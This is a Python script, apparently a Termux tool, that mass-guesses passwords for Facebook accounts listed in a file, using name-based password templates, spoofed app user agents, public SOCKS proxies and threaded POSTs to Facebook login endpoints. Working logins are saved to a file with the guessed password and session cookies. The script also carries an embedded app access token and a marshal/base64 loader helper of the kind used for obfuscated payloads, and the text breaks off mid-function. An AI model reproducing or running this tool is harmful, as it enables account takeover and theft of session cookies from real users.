
import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
import os
import re
import sys
import uuid
import json
import time
import string
import random
from pip._vendor import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

W = '\033[1;97m'
G = '\033[38;5;46m'
R = '\033[38;5;196m'
B = '\x1b[38;5;45m'
Y = "\x1b[38;5;208m"
X = f"{W}[★]"

os.system('clear')
print(" [~] Installing Modules.....")

logo = f"""{G}

Yb  dP 88 88""Yb  dP"Yb  
 YbdP  88 88__dP dP   Yb 
 dPYb  88 88""Yb Yb   dP 
dP  Yb 88 88oodP  YbodP  {R}XD    
{Y}------------------------------------------------
 {G} DEVELOPER → TAHSAN ISLAM MAHIN
  {G}VERSION → 10.20 
{Y}------------------------------------------------"""

devices = {
    "Samsung": {
        "Samsung Galaxy S6": {"FBSV": "6.0", "FBDV": "SM-G920F", "density": "2.5", "resolution": (1440, 2560)},
        "Samsung Galaxy J7": {"FBSV": "6.0", "FBDV": "SM-J700F", "density": "2.0", "resolution": (720, 1280)},
        "Samsung Galaxy Note 5": {"FBSV": "7.0", "FBDV": "SM-N920C", "density": "2.6", "resolution": (1440, 2560)},
    },
    "Realme": {
        "Realme 1": {"FBSV": "6.0", "FBDV": "RMX1805", "density": "2.4", "resolution": (1080, 2160)},
        "Realme 2": {"FBSV": "7.1", "FBDV": "RMX1807", "density": "2.5", "resolution": (720, 1520)},
        "Realme C1": {"FBSV": "7.1", "FBDV": "RMX1811", "density": "2.3", "resolution": (720, 1520)},
    },
    "Windows": {
        "Surface Pro 4": {"FBSV": "10", "FBDV": "Surface_Pro_4", "density": "2.5", "resolution": (2736, 1824)},
        "Surface Book": {"FBSV": "10", "FBDV": "Surface_Book", "density": "2.5", "resolution": (3000, 2000)},
        "HP Pavilion x360": {"FBSV": "10", "FBDV": "HP_Pavilion_x360", "density": "2.2", "resolution": (1366, 768)},
    }
}

languages = ["en_US", "en_GB", "en_IN"]
fbca_values = ["arm64-v8a:null;", "arm64-v8a:;", "armeabi-v7a:armeabi;"]
def user_agent():
    veranduid = [
        "476.0.0.49.74|454214857", "475.0.0.40.82|454014379", "474.0.0.52.74|453811755",
        "474.0.0.44.74|453810718", "474.0.0.0.48|453802389", "472.0.0.45.79|453410037",
        "472.0.0.0.49|453403994", "471.0.0.0.2|453200356", "467.1.0.52.83|452416153",
        "467.0.0.46.83|452415324", "466.0.0.55.85|452214655", "465.0.0.60.83|452016700",
        "465.0.0.0.6|452000754", "464.0.0.0.55|451805674", "463.0.0.0.50|451606073",
        "461.0.0.0.73|451208771", "460.0.0.0.52|451006355", "458.0.0.38.86|450614458",
        "455.0.0.0.35|450004028", "454.0.0.0.77|449808468", "450.0.0.42.110|449017334",
        "445.0.0.34.118|448014984", "443.0.0.23.229|447626277", "427.0.0.31.63|444411021",
        "426.0.0.26.50|444209262", "420.0.0.32.61|443010639", "419.0.0.37.71|442812559",
        "419.0.0.29.71|442811621", "418.0.0.33.69|442611883", "417.0.0.33.65|442410873",
        "416.0.0.35.85|442213661", "415.0.0.34.107|442016421", "414.0.0.30.113|441815108",
        "413.0.0.30.104|441615153", "412.0.0.22.115|441416105", "411.1.0.29.112|441216522",
        "410.0.0.26.115|441017073", "409.0.0.27.106|440813707", "408.1.0.36.103|440614097",
        "407.0.0.30.97|440412261", "406.0.0.26.90|440212037", "405.1.0.28.72|440003403",
        "405.0.0.23.72|440002512", "404.0.0.35.70|421812321", "403.0.0.27.81|421611052",
        "402.0.0.21.84|421409151", "401.0.0.24.77|421209723", "400.0.0.37.76|421011115",
        "399.0.0.24.93|420811604", "398.0.0.21.105|420612354", "397.0.0.23.404|420441389"
    ]
    fb_version, fb_uid = random.choice(veranduid).split('|')
    prefix = fb_uid[:2]
    fb_uid_B = prefix + ''.join(random.choices(string.digits, k=len(fb_uid) - 2))
    brand = random.choice(list(devices.keys()))
    model, specs = random.choice(list(devices[brand].items()))
    carriers = [
        "T-Mobile", "AT&T", "Verizon", "TeLOCKom", "Vodacom", "Airtel", "MTN", "Sprint", "UK-2", "Etisalat",
        "Roshan", "Telma", "Globe", "TeLOCKomsel", "Grameenphone", "Banglalink", "TeletaLOCK", "Robi",
        "Aktel", "JIO", "Vodafone", "BSNL"
    ]
    language = random.choice(languages)
    fbca = random.choice(fbca_values)
    ua = (f"[FBAN/FB4A;FBAV/{str(random.randint(11,99))}.0.0.{str(random.randint(1111,9999))};"
          f"FBBV/{str(random.randint(1111111,9999999))};[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_uid};"
          f"FBDM/{{density={specs['density']},width={specs['resolution'][0]},height={specs['resolution'][1]}}};"
          f"FBLC/{language};FBRV/{fb_uid_B};FBCR/{random.choice(carriers)};FBMF/{brand};FBBD/{brand};"
          f"FBPN/com.facebook.katana;FBDV/{specs['FBDV']};FBSV/{specs['FBSV']};FBOP/19;FBCA/{fbca}]")
    return ua



devices = {
    "Motorola": {
        "Moto G4": {"FBSV": "7.0", "FBDV": "Moto G4", "density": "2.5", "resolution": (1080, 1920)},
        "Moto E4": {"FBSV": "7.1", "FBDV": "Moto E4", "density": "2.0", "resolution": (720, 1280)},
        "Moto Z2": {"FBSV": "7.1", "FBDV": "Moto Z2", "density": "2.6", "resolution": (1440, 2560)},
    },
    "Zyrex": {
        "Zyrex ZS7": {"FBSV": "6.0", "FBDV": "Zyrex ZS7", "density": "2.3", "resolution": (720, 1280)},
        "Zyrex ZS10": {"FBSV": "6.0", "FBDV": "Zyrex ZS10", "density": "2.5", "resolution": (1080, 1920)},
    },
    "Thomson": {
        "Thomson THT500": {"FBSV": "5.1", "FBDV": "Thomson THT500", "density": "2.4", "resolution": (720, 1280)},
        "Thomson THT400": {"FBSV": "5.1", "FBDV": "Thomson THT400", "density": "2.2", "resolution": (480, 854)},
    },
    "iTel": {
        "iTel A32F": {"FBSV": "7.0", "FBDV": "iTel A32F", "density": "2.0", "resolution": (480, 854)},
        "iTel S11": {"FBSV": "6.0", "FBDV": "iTel S11", "density": "2.0", "resolution": (720, 1280)},
    },
    "Infinix": {
        "Infinix Hot 4": {"FBSV": "6.0", "FBDV": "Infinix Hot 4", "density": "2.4", "resolution": (720, 1280)},
        "Infinix Zero 5": {"FBSV": "7.0", "FBDV": "Infinix Zero 5", "density": "2.5", "resolution": (1080, 1920)},
    }
}

languages = ["en_US", "en_GB", "en_IN", "bn_BD", "th_Qaau_TH", "bn_BD", "hi_IN", "gu_Qaau_IN", "en_BM", "en_BD", "en_Qaau_GB", "en_Qaau_US"]
fbca_values = ["arm64-v8a:null;]", "arm64-v8a:;]", "armeabi-v7a:armeabi;]"]
fb_version = "427.0.0.31.63"
fb_build = "444411021"
def useragent_control():
    one = str(random.randint(101,303))
    two = str(random.randint(101,303))
    U_V1 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097196;FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_GB;FBCR/IND airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 4i;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V2 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454129;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/airtel;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/A0001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V3 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_GB;FBCR/Reliance;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1033;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V4 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20748104;FBDM/{{density=1.5,width=540,height=960}};FBLC/en_US;FBCR/XL Axiata;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A33w;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V5 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454026;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D801;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V6 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097172;FBDM/{{density=1.5,width=540,height=960}};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V7 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748054;FBDM/{{density=2.0,width=720,height=1280}};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500Y;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
    U_V8 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748051;FBDM/{{density=1.5,width=540,height=960}};FBLC/es_ES;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI G6-L11;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
    U_V9 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
    U_V10 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20453986;FBDM/{{density=1.5,width=480,height=854}};FBLC/es_LA;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y511-U251;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]"
    A_VALL = random.choice([U_V1, U_V2, U_V3, U_V4, U_V5, U_V6, U_V7, U_V8, U_V9, U_V10])
    return A_VALL
def useragent():
    fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
    enCRACK1 = ['en_GB','en_US']
    CRACKfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
    CRACKsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat','null','','']
    modelxxx =  ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    gtt =random.choice(modelxxx)
    android_version=str(random.randrange(6,13))
    fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
    
    fbbv = str(random.randint(111111111,999999999))
    
    lc = random.choice(enCRACK1)
    cr = random.choice(CRACKsim1)
    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return CRACK_ua
    
def sexua():
    android_versions = ['10', '11', '12']
    mobile_models = [
        'Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11',
        'LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3',
        'OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52',
        'Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro',
        'Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II',
        'Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra',
        'OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ',
        'Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2',
        'OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ',
        'Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro',
        'Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play',
        'Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro',
        'Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4',
        'Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro',
        'Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3',
        'Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro',
        'Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus',
        'Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL',
        'Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3'
        # Add more mobile models here
    ]
    den = random.choice(['{density=3.0,width=1080,height=2401}'
,'{density=3.0,width=1080,height=2161}',
'{density=1.5,width=1280,height=720}',
'{density=2.0,width=720,height=1344}',
'{density=1.75,width=720,height=1488}',
'{density=1.0,width=1066,height=552}',
'{density=2.0,width=480,height=854}',
'{density=1.5,width=1200,height=1848}',
'{density=1.3312501,width=1280,height=736}',
'{density=3.0,width=1080,height=2208}',
'{density=4.0,width=1440,height=2392}',
'{density=1.0,width=320,height=480}',
'{density=3.0,width=1080,height=1920}',
'{density=1.46875,width=720,height=1510}',
'{density=2.625,width=1080,height=2034}',
'{density=1.5,width=1200,height=1920}',
'{density=2.0,width=720,height=1280}',
'{density=2.0,width=720,height=1448}',
'{density=1.275,width=540,height=1071}'
])
    android_version = random.choice(android_versions)
    mobile_model = random.choice(mobile_models)
    dev = mobile_model.split(' ')[0]
    x = str(random.randint(11,999))+".1.0."+str(random.randint(11,99))+"."+str(random.randint(11,99))
    xx = ''.join(str(random.randint(0, 9)) for _ in range(9))
    xxx = ''.join(str(random.randint(0, 9)) for _ in range(9))
    cl = random.choice(['hr_HR','ar_EG','en_Qaau_PK','en_Qaau_GB','en_Qaau_US','as_IN','fa_IR','fi_FI','en_US','en_GB','en_PK','ru_RU','de_DE','en_BD','en_IN','en_AF','ar_Qaau_AR','ar_AR','at_AT','en_AL','en_DZ','en_AS','en_AD','en_AO','en_AI','en_AQ','en_AG','en_AM','en_AW','en_AU','en_AT','en_AZ','en_BS','en_BH','en_BB','en_BY','en_BE','en_BZ','en_BJ','en_BM','en_BT','en_BO','en_BQ','en_BA','en_BW','en_BV','en_BR','en_IO','en_BN','en_BG','en_BF','en_AX','en_ZW','en_ZM','en_YE','en_EH','en_WF','en_VI','en_VG','en_VN','en_VE'])
    cr = random.choice(['Three','1O1Ocsl','O2','WOM','Telcel','3SE','OneCall','1010','Vodafone IN','Vodafone id','Jazz','Telenor','Zong','Vodefone','Plus','SGP-M1','airtel','Greenphone','StarHub','giga','simyo','BITE','BITE LV','Sprint','inwi','EE','MTS Armenia','UMS','NL KPN','Ufone','China Telecom','SimSim','BAKCELL','Geocell','Jio 4G','Jio','Team','TEAM','UzMobile','Beeline','Vodefone US','A-Mobile','MAGTICOM','XL','axis','Spectrum','ZZ','LMT','Tele2','Fido','CC Network','Shelid','null','TeleTok','SUN Mobile','Club','Lycamobile','VIVIFI','Singtel','Circles','Metro by T-Mobile','YOTA','Turkcell','Uztelecom','Mobiuz','GOLAN T','HUMANS','MegaFon','VIVO','UA-KYIVSTAR','KYIVSTAR','Grameenphone','VIRGIN','Orange'])
    user_agent = f"[FBAN/EMA;FBBV/{xx};FBAV/{x};FBDV/{mobile_model};FBSV/12;FBCX/notifications_push_client_sync_graphql;FBDM/{{density=2.0}}]"
    return user_agent
def tanim():
    brand = random.choice(list(devices.keys()))
    model, specs = random.choice(list(devices[brand].items()))
    carriers = [
        "Maxis", "Celcom", "Digi", "U Mobile", "Yes", "Unifi Mobile",
        "Airtel", "JIO", "Vodafone Idea", "BSNL", "MTNL",
        "Grameenphone", "Banglalink", "TeletaLOCK", "Robi",
        "T-Mobile", "AT&T", "Verizon", "TeLOCKom", "Vodacom", "Sprint", 
        "UK-2", "Etisalat", "Roshan", "Telma", "Globe", "TeLOCKomsel"
    ]
    language = random.choice(languages)
    fbca = random.choice(fbca_values)
    build_version = random.choice(["SP1A", "TP2A", "SP1A", "SP1A", "TP1A", "TP1A", "SP1A", "TP1A", "RKQ1", "TP1A", "TP1A", "RP1A", "RP1A", "RKQ1", "TQ3A", "TD2A", "TD4A", "TQ3A", "TP1A", "TP1A", "SP2A", "SD2A", "SQ3A", "RD2A", "RQ3A", "RP1A", "QD4A", "QQ3A", "QP1A", "PQ3B", "PD2A", "PPR2", "PPR1", "OPM8", "OPR6"])
    numbr = str(random.randint(111111,999999)) + "." + str(random.randint(111,999))
    ua_fb = (f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_build};FBDM/{{density={specs['density']},width={specs['resolution'][0]},height={specs['resolution'][1]}}};FBLC/{language};FBRV/{fb_build};FBCR/{random.choice(carriers)};FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{specs['FBDV']};FBSV/{specs['FBSV']};FBCA/{fbca}")
    dalvik_version = random.choice(["2.1.0", "2.1.2", "2.2.0", "2.3.0", "3.0.0"])
    ua_dalvik = f"Dalvik/{dalvik_version} (Linux; U; Android {specs['FBSV']}; {specs['FBDV']} Build/{build_version}.{numbr})"

    return f"{ua_dalvik} {ua_fb}"

def myua():
        phone_models = {
            "Samsung": [
                {"model": "SM-P610", "build": "P610XXS3FWD2"},
                {"model": "SM-T595", "build": "T595XXU4CVG4"},
                {"model": "SM-A107M", "build": "A107MUBS6CWD3"},
                {"model": "SM-A307GT", "build": "A307GTVJS5CWE2"},
                {"model": "SM-G991U", "build": "G991USQS8EWG1"},
                {"model": "SM-G985F", "build": "G985FXXSIHWGA"},
                {"model": "SM-N985F", "build": "N985FXXS7HWG1"},
                {"model": "SM-A515F", "build": "A515FXXU7HWF1"},
                {"model": "SM-A725F", "build": "A725FXXU6DWE3"},
                {"model": "SM-M315F", "build": "M315FXXU3CWA2"},
                {"model": "SM-F916U", "build": "F916USQS2JWE4"}],
            "Other": [
                {"model": "Pixel-5", "build": "G01234"},
                {"model": "iPhone-12", "build": "15A372"},
                {"model": "LG-G8", "build": "V20d"},
                {"model": "OnePlus-9", "build": "OP9XXU1ABC1"},
                {"model": "Xiaomi-Mi11", "build": "MI11XIU2BUC5"}]}
        mobile_names = [
        "Galaxy",
        "Nova",
        "ZenFone",
        "Nexus",
        "Razor",
        "Xperia",
        "Moto",
        "Pixel",
        "Lumia",
        "Redmi",]
        brand = random.choice(list(phone_models.keys()))
        model_data = random.choice(phone_models[brand])
        model_ = model_data["model"]
        build = model_data["build"]
        os_v = random.randint(4, 13)
        fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
        locales = ["en_US", "fr_FR", "es_ES", "de_DE", "it_IT", "pt_BR", "ru_RU", "zh_CN", "ja_JP"]
        locale = random.choice(locales)
        mob = random.choice(mobile_names)
        ua = (
            '[FBAN/Orca-Android;FBAV/'
            + str(fbav)
            + ';FBPN/com.facebook.orca;FBLC/'
            + locale
            + ';FBBV/'
            + str(random.randint(111111111, 999999999))
            + ';FBCR/null;FBMF/'
            + mob.lower()
            + ';FBBD/'
            + mob.lower()
            + ';FBDV/'
            + str(model_)
            + '/7.2.9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=810,height=1704};FB_FW/1;]')
        return ua
        
try:
    proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()

class RANDOM:
    def __init__(self):
        self.plist = []
        self.oks = []
        self.cps = []
        self.loop = 0
        self.ugen = []
        self.user = []
        self.cok = []
        self.rc = random.choice
        self.rr = random.randint
        self.session = requests.Session()
        self.main()

    def clear(self):
        os.system("clear")
        print(logo)

    def linex(self):
        print(f"{W}------------------------------------------------")

    def main(self):
        self.clear()
        print(f"{W} [1] File Cloning\n [2] Number Cloning\n [3] Contact Admin (fb) \n [0] {R}Exit")
        self.linex()
        x = input(f" {X} Choice > ")
        if x == "1":
            self.file()
        elif x == "2":
            self.rnd()
        elif x == "3":
            os.system("termux-open https://www.facebook.com/profile.php?id=100054003651036&mibextid=ZbWKwL")
        elif x == "0":
            sys.exit()
        else:
            self.main()

    def file(self):
        self.clear()
        file = input(f" {X} Put File Path > ")
        self.linex()
        try:
            with open(file) as f:
                tani = f.read().splitlines()
        except FileNotFoundError:
            print(f" {X}{R} File Location Not Found.")
            time.sleep(1)
            self.file()
            return
        try:
            pasx = int(input(f" {X} Password Limit > "))
        except ValueError:
            pasx = 15
        self.linex()
        for i in range(pasx):
            self.plist.append(input(f" {X} Put Pas {G}{i+1}{W} > "))
        self.linex()
        print(f" {X} Method {G}1{R}>{G}2{R}>{G}3{W}")
        self.linex()
        mtd = input(f" {X} Choice > ")
        self.clear()
        tl = str(len(tani))
        print(f" {X} Total Account > {G}{tl}\n {X} Use Airplane ({R}Flight{W}) Mode For Speed Up")
        self.linex()
        with ThreadPoolExecutor(max_workers=30) as executor:
            for user in tani:
                ids, names = user.split('|')
                passlist = self.plist
                if mtd == "1":
                    executor.submit(self.mtdA, ids, names, passlist, tl)
                elif mtd == "2":
                    executor.submit(self.mtdB, ids, names, passlist, tl)
                else:
                    executor.submit(self.mtdC, ids, names, passlist, tl)
        print("")
        self.linex()
        print(f" {X} Total Ok Account >{G} {len(self.oks)}\n {X} Total Cp Account >{R} {len(self.cps)}")
        self.linex()
        print(f" {X} The Process Has Completed \n {X} Thanks For Using My Tools")
        self.linex()
        sys.exit()

    def mtdA(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M1|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua="[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+".0.0."+str(random.randint(1111,9999))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Nagad;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2239A;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]"
                data = {
                    'adid': str(uuid.uuid4()),
                    'method': 'POST',
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'family_device_id': str(uuid.uuid4()),
                    'secure_family_device_id': str(uuid.uuid4()),
                    'email': ids, 'password': pas,
                    'cpl': 'true', 'credentials_type': 'password',
                    'generate_session_cookies': '1', 
                    'error_detail_type': 'button_with_disabled',
                    'generate_machine_id': '1',
                    'os_ver': '5.1',
                    'carrier': 'Banglalink',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'omit_response_on_success': 'false',
                    'enroll_misauth': 'false',
                    'advertising_id': str(uuid.uuid4()),
                    'encrypted_msisdn': '',
                    'fb_api_req_friendly_name': 'authenticate'}
                headers = {
                    'host': 'b-graph.facebook.com',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-connection-bandwidth': str(random.randint(20000,50000)),
                    'x-fb-net-hni': str(random.randint(20000,50000)),
                    'x-fb-net-hni': str(random.randint(20000,50000)),
                    'Zero-Rated': '0', 'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'User-Agent':'[FBAN/FB4A;FBAV/34.0.0.3867;FBBV/2353134;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Nagad;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2243A;FBSV/9;nullFBCA/armeabi-v7a:armeabi;]',
                    'content-type': 'app_authlication/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger', 'x-fb-client-IP': 'True',
                    'x-fb-server-cluster': 'Keep-Alive'}
                po = self.session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[XIBO-OK] {ids} | {pas}")
                    with open('/sdcard/XIBO-OK.txt', 'a') as f:
                        f.write(ids + '|' + pas + '|' + cookie + '\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in tst['error']['message']:
                    print(f"\r\r {G}[CP] {ids} | {pas}")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.mtdA(ids,names,passlist,tl)
        except Exception as e:
            pass

    def mtdB(self, ids, names, passlist, tl):
        try:
            sys.stdout.write(f"\r {W}[FILE]-[{self.loop}] M2|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}"),
            sys.stdout.flush()
            first = names.split(' ')[0]
            last = names.split(' ')[1] if len(names.split(' ')) > 1 else 'Khan'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua = user_agent()
                data = {
                    "adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": pas,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "en_US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    'User-Agent': useragent_control(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
                }
                po = self.session.post("https://api.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).text
                tst = json.loads(po)
                if 'session_key' in tst:
                    cookie = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                    print(f"\r\r {G}[OK] {ids} | {pas}")
